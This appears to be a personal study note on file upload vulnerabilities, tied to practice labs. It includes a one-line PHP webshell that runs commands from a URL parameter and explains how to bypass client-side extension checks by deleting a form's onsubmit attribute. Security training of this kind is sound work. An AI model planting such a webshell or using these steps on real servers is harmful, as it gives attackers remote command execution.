
Imagine that you have a webpage, and this page have a section of uploads file, like an image of the profile.

You can upload a malicious file like a reverse shell in php if the server have apache and interpret php

---

# Upload 1

You can upload a webshell write in php

````php
<?php
    system($_GET['cmd']);
?>
````

When you open the url where is the image you can use the parameter cmd to inject commands

> http://localhost:9001/uploads/cmd.php?cmd=id


---

# Upload 3

Only admit files with extensions: .jpg, .jpeg, .bmp, gif, png

When we see some type of validiation we have to check if it is client side or server side (or both)

If we check the source code, we can see an script named **validate.js**

![](../../Images/Pasted%20image%2020230821172705.png)

We can see that in a few lines up that there are an onsubmit attribute 

![](../../Images/Pasted%20image%2020230821172838.png)

If we do ctr+shift+c and click in the buttom of uploads, three lines up we can delete the attribute

![](../../Images/Pasted%20image%2020230821173229.png)

If we delete the attribute we are omitting the script that check if the file have a correct extension

Remember, when you reload the website you have to delete again the submit attribute

And there we go

![](../../Images/Pasted%20image%2020230821173434.png)

🥳🥳 The file was upload successfully

---

# Upload 10



---

# Labs

- https://github.com/moeinfatehi/file_upload_vulnerability_scenarios


---

# Tags

#vulnerabilty #uploadfiles #webshell #php 